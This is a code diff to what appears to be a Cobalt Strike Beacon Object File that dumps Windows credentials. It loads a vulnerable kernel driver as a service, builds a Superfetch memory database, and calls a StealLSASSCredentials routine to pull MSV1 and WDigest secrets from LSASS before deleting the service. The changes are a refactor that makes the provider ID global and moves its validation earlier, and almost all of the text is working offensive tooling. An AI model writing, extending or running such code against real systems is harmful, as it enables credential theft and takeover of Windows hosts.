@@ -19,6 +19,8 @@
 
 formatp outputbuffer;
 
+int provider = -1;
+
 int go(char *args, int argLen)
 {
     datap parser;
@@ -33,7 +35,7 @@ int go(char *args, int argLen)
         return FALSE;
     }
     
-    int provider = BeaconDataInt(&parser);
+    provider = BeaconDataInt(&parser);
     char* mode = BeaconDataExtract(&parser, &modeLen);
     
     if (!mode || modeLen <= 0 || mode[0] == '\0')
@@ -75,6 +77,17 @@ int go(char *args, int argLen)
         return FALSE;
     }
 
+    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
+    if (prov_info == NULL)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
+        return FALSE;
+    }
+    else
+    {
+        BeaconPrintf(CALLBACK_OUTPUT, "[INFO] Provider: %s", prov_info->service_name);
+    }
+
     // We can create buffer now that the initial checks have passed
     BeaconFormatAlloc(&outputbuffer, 4096);
 
@@ -87,19 +100,6 @@ int go(char *args, int argLen)
     }
     BeaconFormatPrintf(&outputbuffer, "[+] Enabled SE_PROF_SINGLE_PROCESS_PRIVILEGE\n");
 
-    PROVIDER_INFO* prov_info = GetProviderInfo(provider);
-    if (prov_info == NULL)
-    {
-        BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
-        BeaconPrintf(CALLBACK_ERROR, "Invalid provider ID: %d", provider);
-        BeaconFormatFree(&outputbuffer);
-        return FALSE;
-    }
-    else
-    {
-        BeaconFormatPrintf(&outputbuffer, "[INFO] Provider: %s\n", prov_info->service_name);
-    }
-
 
     DWORD NT_MAJOR_VERSION, NT_MINOR_VERSION, NT_BUILD_NUMBER;
     RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
@@ -108,7 +108,7 @@ int go(char *args, int argLen)
 
 
     // Install service
-    if (!isServiceInstalled(provider))
+    if (!isServiceInstalled())
     {
         BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
         BeaconFormatFree(&outputbuffer);
@@ -122,7 +122,7 @@ int go(char *args, int argLen)
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to get handle to vulnerable driver!\n");
 
-        if (!removeService(provider))
+        if (!removeService())
         {
             BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
         }
@@ -142,7 +142,7 @@ int go(char *args, int argLen)
     // Create Superfetch Database
     if (!CreateGlobalSuperfetchDatabase(use_PF_MEMORYRANGEINFO_V2))
     {
-        if (!removeService(provider))
+        if (!removeService())
         {
             BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
         }
@@ -156,7 +156,7 @@ int go(char *args, int argLen)
     }
 
 
-    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials, provider))
+    if (!StealLSASSCredentials(hFile, NT_BUILD_NUMBER, RetrieveMSV1Credentials, RetrieveWDigestCredentials))
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to retrieve LSASS credentials!\n\n");
     }
@@ -166,7 +166,7 @@ int go(char *args, int argLen)
     CloseHandle(hFile);
     
     // Stop and delete service
-    if (!removeService(provider))
+    if (!removeService())
     {
         BeaconFormatPrintf(&outputbuffer, "[!] Failed to remove driver service!\n");
     }
